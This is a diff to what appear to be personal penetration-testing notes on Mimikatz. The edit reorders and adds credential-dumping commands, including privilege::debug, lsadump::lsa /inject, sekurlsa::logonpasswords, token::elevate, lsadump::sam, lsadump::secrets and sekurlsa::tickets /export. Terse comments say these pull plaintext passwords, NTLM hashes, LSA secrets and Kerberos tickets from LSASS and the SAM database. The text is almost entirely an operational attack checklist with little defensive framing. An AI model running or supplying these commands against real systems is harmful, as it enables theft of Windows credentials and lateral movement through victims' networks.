@@ -12,14 +12,23 @@ if you don't run mimikatz as an administrator, mimikatz will not run properly
 Export Tickets Use /export
 Always try /patch and /inject  in LSA dump sDifferenct technique of the attack
 
-privilege::debug
-
 #The debug privilege allows you to debug and tune the memory of a process owned by another user account  a necessary step for extracting plaintext passwords from LSASS.
 
-sekurlsa::logonpasswords
+privilege::debug
+
+#writes a log file
+log
+
+# dumps local security authority logon sessions
+lsadump::lsa
+lsadump::lsa /inject
+
 
 #record all users who have recently logged into the system
 #NTLM and SHA1 password hashes cracked to reveal  uses pass
+
+sekurlsa::logonpasswords
+
 
 #To export credentials stored in the SAM database, you must first upgrade your privileges from Administrator to system. which are necessary to extract data from the SAM database.
 token::elevate
@@ -31,8 +40,7 @@ lsadump::sam
 #dump lsa secret
 lsadump::secrets
 
-# dumps local security authority logon sessions
-lsadump::lsa
+
 
 #extract tickets
 sekurlsa::tickets /export
